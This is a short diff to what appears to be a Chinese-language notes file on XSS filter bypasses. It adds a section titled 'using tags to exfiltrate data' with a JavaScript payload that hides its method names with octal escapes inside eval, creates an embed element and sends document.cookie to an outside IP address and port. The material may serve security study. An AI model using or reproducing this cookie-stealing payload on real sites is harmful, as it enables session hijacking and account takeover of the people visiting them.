@@ -591,7 +591,16 @@ Static/302.php
 
 
 
-#### 利用标签来bypass
+#### 利用标签来外带数据
+
+##### embed
+
+```javascript
+<body><script>
+var iframe = eval("document.create\105lement('embed')");
+iframe.src="http://39.108.164.219:60005/?"+document.cookie;
+eval("document.body.append\103hild(iframe)");</script></body>
+```
 
 
 
